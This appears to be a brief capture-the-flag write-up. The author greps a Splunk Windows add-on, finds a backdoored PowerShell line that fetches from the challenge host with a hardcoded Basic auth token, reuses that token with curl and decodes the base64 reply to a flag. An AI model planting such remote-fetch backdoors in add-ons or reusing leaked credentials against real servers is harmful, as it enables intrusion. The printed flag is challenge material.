@@ -1,0 +1,14 @@
+Really?? Need to install splunk, no way!
+grep through the zip-archive for the url i got => 
+	Splunk_TA_windows/bin/powershell/nt6-health.ps1:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
+
+Im not authed for accessing the url, but maybe use the token used in the splunk addon (yeah, splunk_ta is apparently an addon for splunk or smthn)
+curly curl
+	curl "http://chal.ctf.games:31106/" -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
+
+ye boii, got some base64:
+ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==
+
+
+base64 -d :
+echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
